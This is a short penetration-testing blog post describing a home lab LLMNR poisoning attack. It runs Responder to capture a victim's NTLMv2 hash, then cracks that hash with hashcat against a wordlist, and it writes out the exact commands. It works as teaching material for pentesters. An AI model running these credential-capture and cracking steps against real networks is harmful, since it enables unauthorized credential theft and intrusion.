---
layout: post
title: "Link-Local Multicast Name Resolution (LLMNR) Attack Lab"
twitter_image: /images/LLMNR-AttackLab/Diagram3.png
description: "Link-Local Multicast Name Resolution (LLMNR) Attack Lab."
date: 2020-06-11
feature_image: /images/LLMNR-AttackLab/Diagram3.png
tags: [CyberSecurity]
hashtags: CyberSecurity,LLMNR,PenTesting
---

This blog post is about LLMNR attack. LLMNR attack is commonly used by Penetration testers during an engagement to get their hands on NLMv2 hash. The captured hash is either used to obtain the original password or used in the pass the hash attack.
<!--more-->

If you are looking for more information on LLMNR here’s an excellent [resource](https://attack.mitre.org/techniques/T1171/)

```
kali@kali:~/Responder$ git clone https://github.com/lgandx/Responder.git
```
{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram1.png" caption="" %}

```
kali@kali:~$ sudo ifconfig
```

{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram2.png" caption="" %}

```
kali@kali:~/Responder$ sudo ./Responder.py -I eth0 -rdwv
```
{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram3.png" caption="" %}

{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram4.png" caption="" %}

Let’s try to access non existing shared drive called “catland”. Seeing this request responder reply backs to our machine which in turn result in our machine sending username and NTLMv2 password.

{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram5.png" caption="" %}

{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram6.png" caption="" %}

Save the captured hash into a file called “kreese”

{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram7.png" caption="" %}

On a fresh install of Kali, you need to unzip the rockyou wordlist. It is stored at /usr/share/wordlist directory.

```
kali@kali:~$ cd /usr/share/wordlists/
kali@kali:/usr/share/wordlists$ ls
dirb dirbuster fasttrack.txt fern-wifi metasploit nmap.lst rockyou.txt.gz wfuzz
kali@kali:/usr/share/wordlists$ gunzip rockyou.txt.gz
gzip: rockyou.txt: Permission denied
kali@kali:/usr/share/wordlists$ sudo gunzip rockyou.txt.gz
kali@kali:/usr/share/wordlists$ ls
dirb dirbuster fasttrack.txt fern-wifi metasploit nmap.lst rockyou.txt wfuzz
kali@kali:/usr/share/wordlists$ cd
```
{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram8.png" caption="" %}

This command might not work if you are running Kali as a virtual machine. It’s always a good idea to run it on the guest operating system. Since i don’t want machine spending hours cracking the password which i already know for testing purpose i created a custom password list called “guessList” containing password used for test lab.

```
kali@kali:~$ hashcat -m 5600 kreese guessList — force
```
{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram9.png" caption="" %}

{% include diagram.html imageurl="/images/LLMNR-AttackLab/Diagram10.png" caption="" %}

{% include thanks.html %}

